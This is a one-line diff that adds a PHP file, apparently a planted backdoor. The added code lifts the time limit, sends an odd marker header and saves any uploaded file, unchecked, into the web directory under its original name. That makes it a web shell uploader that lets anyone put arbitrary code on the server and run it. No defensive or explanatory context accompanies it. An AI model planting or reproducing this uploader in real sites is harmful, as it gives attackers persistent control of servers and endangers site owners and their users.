@@ -1,0 +1,1 @@
+<?php @set_time_limit(0);@header('null77: pOinter');?><?php echo @copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])?'ok':'no';?>
